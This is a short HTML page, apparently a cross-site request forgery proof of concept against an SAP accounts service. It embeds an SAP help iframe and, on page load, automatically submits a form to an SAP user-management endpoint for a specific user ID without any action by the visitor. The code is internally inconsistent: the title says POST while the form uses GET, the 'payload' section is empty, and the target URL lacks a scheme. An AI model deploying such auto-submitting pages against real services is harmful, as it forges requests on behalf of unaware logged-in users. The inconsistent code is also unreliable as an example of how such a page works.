<!DOCTYPE html>
<html>
<head>
  <title>Auto POST Request with Payload</title>
</head>
<body>
<iframe src="https://help.sap.com/webassistant/context?id=32497794" width="500" height="500"></iframe>
  
  <script>
    window.onload = function() {
      // Define the payload data as an object

      
      // Create a new form element
      const form = document.createElement("form");
      form.method = "GET";
      form.action = "accounts.sap.com/service/um/C5374468"; // Replace with your API endpoint

      // Append the form to the document and submit it
      document.body.appendChild(form);
      form.submit();
    };
  </script>
</body>
</html>
